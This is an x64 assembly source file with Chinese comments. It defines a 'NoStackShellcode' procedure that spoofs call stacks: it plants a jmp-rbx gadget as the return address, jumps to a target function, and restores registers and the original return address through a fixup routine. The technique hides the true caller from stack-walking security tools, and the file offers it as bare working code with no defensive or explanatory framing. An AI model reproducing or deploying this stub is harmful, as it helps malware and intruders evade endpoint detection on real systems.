.CODE
     
NoStackShellcode PROC
    mov [rsp + 8],  rcx     ;shell_param
    mov [rsp + 16], rdx     ;real_arg0
    mov [rsp + 24], r8      ;real_arg1
    mov [rsp + 32], r9      ;real_arg2

    ;shell_param成员修改
    mov rax, [rsp + 8]      ;rax = shell_param
    mov r10, [rsp]          ;r10 = _spoofer_stub函数的原始返回地址
    mov [rax + 24], r10     ;shell_param.shellcode_retaddr = _spoofer_stub ret addr
    mov [rax + 16], rbx     ;保存用于中转gadget使用的rbx的原始值到shell_param.rbx
    lea rbx, fixup          
    mov [rax + 32], rbx     ;shell_param.shellcode_fixstack = fixup
    lea rbx, [rax + 32]     ;rbx = &shell_param.shellcode_fixstack

    ;gadget地址写入栈返回地址
    mov r10, [rax + 0]      ;r10 = shell_param.trampoline = jmp_rbx_0
    mov [rsp + 8],r10       ;中转gadget写入返回地址 = jmp_rbx_0
    
    ;修复调用栈 + jmp realfunction
    add rsp, 8              ;rsp增加已跳过_spoofer_stub比目标function多一个参数对栈的影响(shell_param)
    mov rcx, [rsp + 8]      ;修复rcx寄存器传参
    mov rdx, [rsp + 16]     ;修复rdx寄存器传参
    mov r8, [rsp + 24]      ;修复r8寄存器传参
    mov r9, [rsp + 32]      ;修复r9寄存器传参
    mov r10, [rax + 8]      ;取出realfunction = shell_param.function
    jmp r10
     
fixup:
    sub rsp, 8              ;恢复add rsp, 8影响的堆栈
    lea rcx, [rbx - 32]     ;rcx = shell_param
    mov rbx, [rcx + 16]     ;rbx = shell_param.rbx
    push [rcx + 24]         ;push shell_param.shellcode_retaddr
    ret
NoStackShellcode ENDP
     
END